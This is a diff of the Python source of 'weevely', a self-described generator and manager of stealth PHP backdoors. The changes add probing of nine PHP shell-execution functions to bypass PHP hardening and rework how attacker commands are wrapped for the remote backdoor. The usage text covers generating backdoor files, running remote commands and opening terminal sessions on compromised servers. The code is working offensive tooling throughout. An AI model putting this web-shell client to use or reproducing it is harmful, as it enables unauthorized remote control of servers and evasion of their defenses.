@@ -3,7 +3,10 @@
 
 from numpy import frombuffer, bitwise_xor, byte
 import getopt, sys, base64, os, urllib2, re, urlparse, os
+
     
+methods= [ "system()", "passthru()", "popen()", "exec()", "proc_open()", "shell_exec()", "pcntl_exec()", "perl->system()", "python_eval()" ]
+
 def crypt(text):
   return base64.b64encode(text)
     
@@ -16,8 +19,10 @@ class weevely:
     self.banner()
     self.loadmodules()
   
+    escape=0
+    
     try:
-	opts, args = getopt.getopt(sys.argv[1:], 'ltgm:c:u:p:o:e:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output', 'escape'])
+	opts, args = getopt.getopt(sys.argv[1:], 'ltgsm:c:u:p:o:e:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output', 'escape'])
     except getopt.error, msg:
 	print "Error:", msg
 	exit(2)
@@ -36,12 +41,16 @@ class weevely:
 	  modul=a
 	  moderun='m'
 	if o in ("-e", "-escape"):
-	  if(int(a)%1==0):
+	  a = int(a)
+	  if a>0 and a<9 and a%1==0:
 	    escape=int(a)
 	  else:
 	    print "- Error: escape method is not a valid integer"
 	    sys.exit(1)
-	  
+	
+	if o in ("-s", "-show"):
+	  escape=-1
+	  moderun='s'
 	if o in ("-u", "-url"):
 	  url=a
 	  parsed=urlparse.urlparse(url)
@@ -61,15 +70,21 @@ class weevely:
 
     # Start
     if 'moderun' in locals():
+
   
-      if moderun=='c' or moderun=='t' or moderun=='m':
+
+      if moderun=='c' or moderun=='t' or moderun=='m' or moderun=='s':
+	
+	if 'pwd' not in locals():
+	  pwd=''
+	  while not pwd or len(pwd)<4:
+	    print "+ Please insert almost 4 character long password : ",
+	    pwd = sys.stdin.readline().strip()
+	  
 	
 	if 'url' not in locals():
 	  print "! Please specify URL (-u)"
 	  sys.exit(1)
-	  
-	if('escape') not in locals():
-	  escape=-1;
 	  
 	try:
 	  self.host=host(url,pwd,escape)
@@ -80,16 +95,17 @@ class weevely:
 	  
 
       if moderun=='g':
+	if 'pwd' not in locals():
+	  pwd=''
+	  while not pwd or len(pwd)<4:
+	    print "+ Please insert almost 4 character long password : ",
+	    pwd = sys.stdin.readline().strip()
+	
 	if 'outfile' not in locals():
 	  print "! Please specify where generate backdoor file (-o)"
 	  sys.exit(1)
+	
 
-      if 'pwd' not in locals() and moderun!='l':
-	  
-	pwd=''
-	while not pwd or len(pwd)<4:
-	  print "+ Please insert almost 4 character long password : ",
-	  pwd = sys.stdin.readline().strip()
 
       if moderun=='c':       
 	try:
@@ -113,19 +129,19 @@ class weevely:
 
   def usage(self):
     print """+ Generate backdoor crypted code.
-+  	./weevely -g -o <filepath> -p <password>
++  ./weevely -g -o <filepath> -p <pass>
 +      
-+ Execute shell command.
-+  	./weevely -c <command> -u <url> -p <password>
-+      
-+ Start terminal session.
-+  	./weevely -t -u <url> -p <password>
++ Execute remote commands.
++  ./weevely -c <command> -u <url> -p <pass>			Execute command.    
++  ./weevely -t -u <url> -p <password>		 		Start terminal.	         
 +
-+ List plugins modules (available: """ + ", ".join(self.modules) + """).
-+  	./weevely -l
++ Bypass PHP hardening protections 
++  ./weevely -s							Show available remote functions.
++  ./weevely -e <function number> -t -u <url> -p <password> 	Execute function.
 +
-+ Execute plugin on remote server using arguments.
-+  	./weevely -m <module>::<firstarg>::..::<Narg> -u <url> -p <password>"""
++ Execute PHP modules on remote server 
++  ./weevely -l              				        List available modules.					
++  ./weevely -m <module>::<1arg>::..::<Narg> -u <url> -p <pass> Execute module."""
     
   def banner(self):
     print "+ Weevely - Generate and manage stealth PHP backdoors.\n+"
@@ -276,30 +292,49 @@ class host():
     try:
       os = self.execute_php("echo PHP_OS;")
     except Exception, e:
-      print '! Eval ' + str(i) + ' invalid response: ' + ret +')'
+      raise
+
+    sum_ok = []
+    sum_no = {}
 
     if escape == -1:
+      
+      print "+ Testing functions to bypass PHP hardening. Choose one of accepted with -e <number>."
+      
       first=-1
       for i in range(0,9):
 	try:
 	  ret = self.execute("echo " + self.pwd, i)
 	  if(ret==self.pwd):
-	    print '+ Escape ' + str(i) + ' OK!'
+	    sum_ok.append(methods[i])
 	    first=i
 	  else:
-	    print '- Escape ' + str(i) + ' unexpected response ' + ret
+	    sum_no[methods[i]]=ret
+	    #print '- Escape ' + str(i) + ' unexpected response ' + ret
 	except Exception, e:
-	  print '- Escape ' + str(i) + ' invalid response: ' + ret +')'
+	  sum_no[methods[i]]='Remote PHP error: ' + ret
+	  #print '- Escape ' + str(i) + ' invalid response: ' + ret +')'
+
+      print "+ Accepted functions:",
+      for m in sum_ok:
+	  print  str(methods.index(m)) + " [" + m + "]", 
+      print ''
+	  
+      if len(sum_no)>0:
+	print "- Failed functions: ",
+	for m in sum_no:
+	  print  str(methods.index(m)) + " [" + m + "]", 
+	print ''  
+	  
 
       if first==-1:
-	print 'No working escape function founded.'
+	print '+ No working escape function founded.'
       else:
 	self.method = first
-	print 'Using method ' + str(self.method)
     
     else:
       self.method = escape
-      print 'Using method ' + str(self.method)
+      print '+ Weeveling ' + self.url + ' with ' + methods[escape] + '.' 
     
     return os
 
@@ -322,12 +357,13 @@ class host():
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
-	raise Exception('No valid responses, check password or url')
+	raise Exception('Invalid response. Wrong password, url or backdoor not installed correctly.')
       else:
 	return founded[0].strip()
 
   
   def execute(self, cmnd, met=-1):
+
     
     if(met==-1):
       met=self.method
@@ -337,19 +373,20 @@ class host():
     elif(met==1):
       cmnd="passthru('" + cmnd + " 2>&1');"
     elif(met==2):
-      cmnd="$u = array('" + "','".join(cmnd.split(' ')[1:]) + "'); pcntl_exec('" + cmnd.split()[0] + "', $u);"
-    elif(met==3):
       cmnd="$h=popen('" + cmnd + "', 'r'); echo stream_get_contents($h); pclose($h);"
-    elif(met==4):
+    elif(met==3):
       cmnd="echo @exec('" + cmnd + " 2>&1');"
+    elif(met==4):
+      cmnd = "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes); $r = stream_get_contents ($pipes[1]); echo $r . stream_get_contents($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);" 
     elif(met==5):
       cmnd="shell_exec('" + cmnd + " 2>&1');"
     elif(met==6):
-      cmnd="$perl = new perl(); $r = @perl->system('" + cmnd + " 2>&1'); echo $r"
+      cmnd="$u = array('" + "','".join(cmnd.split(' ')[1:]) + "'); pcntl_exec('" + cmnd.split()[0] + "', $u);"
     elif(met==7):
-      cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"
+      cmnd="$perl = new perl(); $r = @perl->system('" + cmnd + " 2>&1'); echo $r"
     elif(met==8):
-      cmnd = "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes); $r = stream_get_contents ($pipes[1]); echo $r . stream_get_contents($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);"
+      cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"
+
     
     return self.execute_php(cmnd)
     
